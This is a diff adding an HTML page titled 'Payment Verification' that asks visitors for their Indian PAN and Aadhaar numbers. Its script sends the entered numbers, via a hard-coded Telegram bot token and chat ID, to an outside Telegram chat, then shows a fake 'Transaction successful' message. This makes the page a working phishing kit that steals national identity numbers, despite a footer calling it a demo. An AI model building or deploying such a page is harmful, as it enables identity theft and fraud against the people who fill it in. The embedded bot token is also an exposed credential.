@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Verification</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: #f4f4f9;
+        }
+        .header img {
+            width: 100%;
+            height: auto;
+            margin: 20px auto;
+            display: block;
+        }
+        .text-slider {
+            display: flex;
+            overflow: hidden;
+            white-space: nowrap;
+            background: linear-gradient(45deg, #ff416c, #ff4b2b, #1e90ff, #32cd32);
+            background-size: 300% 300%;
+            padding: 10px 0;
+            animation: bgAnimation 6s infinite linear;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+        }
+        .text-slider span {
+            display: inline-block;
+            padding: 0 30px;
+            font-size: 18px;
+            font-weight: bold;
+            color: #fff;
+            text-shadow: 0 0 5px rgba(255, 255, 255, 0.8), 0 0 10px rgba(255, 255, 255, 0.6);
+            animation: marquee 10s linear infinite;
+        }
+        @keyframes marquee {
+            from { transform: translateX(100%); }
+            to { transform: translateX(-100%); }
+        }
+        @keyframes bgAnimation {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        .form-container {
+            padding: 20px;
+            background: #f9f9f9;
+            animation: fadeIn 1s ease-in-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        form {
+            max-width: 400px;
+            margin: auto;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            animation: slideIn 1s ease-in-out;
+        }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            transition: border-color 0.3s ease;
+        }
+        input:focus {
+            border-color: blue;
+            outline: none;
+        }
+        .btn {
+            background: blue;
+            color: white;
+            padding: 10px;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            border-radius: 5px;
+            transition: background 0.3s ease;
+        }
+        .btn:hover {
+            background: darkblue;
+        }
+        .footer {
+            padding: 20px;
+            background: #333;
+            color: white;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .footer a {
+            color: white;
+            text-decoration: none;
+            margin: 0 10px;
+            transition: color 0.3s ease;
+        }
+        .footer a:hover {
+            color: blue;
+        }
+        .footer p {
+            margin: 5px 0;
+        }
+        .warning {
+            color: red;
+            font-size: 0.9em;
+            display: none;
+        }
+        .popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            display: none;
+            z-index: 1000;
+            animation: fadeIn 0.3s ease-in-out;
+        }
+        .popup button {
+            background: blue;
+            color: white;
+            padding: 10px;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="OIP.png" alt="Header Image" onerror="this.src='placeholder.png';">
+    </div>
+    <div class="text-slider">
+        <span>Payment Verification | Secure Payment Processing | Trusted Service</span>
+        <span>24/7 Payment Support | Your Security, Our Priority | Trusted Service</span>
+        <span>Reliable Payment Processing | Secure Transactions | We’re Here for You</span>
+        <span>Fast & Secure Payments | Payment Processing Excellence | We Listen, We Act</span>
+        <span>Quality Payment Processing | Secure Transactions | Your Security Matters</span>
+        <span>Exceptional Payment Service | Dedicated Payment Support | Trust & Security Guaranteed</span>
+    </div>
+    <div class="form-container">
+        <form id="paymentForm">
+            <h2>Payment Verification</h2>
+            <input type="text" id="panCardNumber" placeholder="PAN Card Number (e.g., ASYHH7734E)" maxlength="10" required>
+            <p class="warning" id="panCardWarning">Please enter a valid PAN Card Number (10 characters).</p>
+            <input type="text" id="aadharCardNumber" placeholder="Aadhar Card Number (e.g., 6732 7663 6737)" maxlength="14" required>
+            <p class="warning" id="aadharCardWarning">Please enter a valid Aadhar Card Number (12 digits with spaces).</p>
+            <button type="submit" class="btn">Submit</button>
+        </form>
+    </div>
+    <div class="footer">
+        <p><a href="index.html">Home</a> | <a href="about.html">About</a> | <a href="policy.html">Policy</a></p>
+        <p>Disclaimer: This is a demo payment verification page. All information provided is fictional.</p>
+        <p>&copy; 2025 Payment Verification. All Rights Reserved.</p>
+    </div>
+    <div class="popup" id="confirmationPopup">
+        <p>Are you sure you filled out the form correctly?</p>
+        <button onclick="confirmSubmission()">Yes</button>
+        <button onclick="closePopup()">No</button>
+    </div>
+    <div class="popup" id="successPopup">
+        <p>Transaction successful! Redirecting...</p>
+    </div>
+    <script>
+        function validateForm(event) {
+            event.preventDefault();
+            const panCardNumberInput = document.getElementById('panCardNumber');
+            const aadharCardNumberInput = document.getElementById('aadharCardNumber');
+            const panCardWarning = document.getElementById('panCardWarning');
+            const aadharCardWarning = document.getElementById('aadharCardWarning');
+            let isValid = true;
+
+            // Validate PAN Card Number
+            const panCardValue = panCardNumberInput.value.trim();
+            const panCardRegex = /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/; // PAN Card format
+            if (!panCardRegex.test(panCardValue)) {
+                panCardWarning.style.display = 'block';
+                isValid = false;
+            } else {
+                panCardWarning.style.display = 'none';
+            }
+
+            // Validate Aadhar Card Number
+            const aadharCardValue = aadharCardNumberInput.value.trim().replace(/\s/g, ''); // Remove spaces for validation
+            const aadharCardRegex = /^\d{12}$/; // Aadhar format
+            if (!aadharCardRegex.test(aadharCardValue)) {
+                aadharCardWarning.style.display = 'block';
+                isValid = false;
+            } else {
+                aadharCardWarning.style.display = 'none';
+            }
+
+            // Show confirmation popup
+            if (isValid) {
+                document.getElementById('confirmationPopup').style.display = 'block';
+            }
+        }
+
+        function confirmSubmission() {
+            const panCardNumber = document.getElementById('panCardNumber').value;
+            const aadharCardNumber = document.getElementById('aadharCardNumber').value;
+
+            // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual bot token and chat ID
+            const botToken = '7844394659:AAHvA5nX4lt68_5jayLddHDPr4W09JQlSsI';
+            const chatId = '-1002354984113';
+            const message = `PAN Card Number: ${panCardNumber}\nAadhar Card Number: ${aadharCardNumber}`;
+
+            // Send data to Telegram bot
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+                document.getElementById('confirmationPopup').style.display = 'none';
+                document.getElementById('successPopup').style.display = 'block';
+
+                setTimeout(() => {
+                    window.location.href = 'succ.html'; // Redirecting to succ.html
+                }, 2000);
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                alert('Failed to send data to verify. Please try again.');
+            });
+        }
+
+        function closePopup() {
+            document.getElementById('confirmationPopup').style.display = 'none';
+        }
+
+        // Format Aadhar Card Number on input
+        document.getElementById('aadharCardNumber').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-numeric characters
+            if (value.length > 12) {
+                value = value.slice(0, 12); // Limit to 12 digits
+            }
+            e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ').trim(); // Add space every 4 digits
+        });
+
+        document.getElementById('paymentForm').addEventListener('submit', validateForm);
+    </script>
+</body>
+</html>
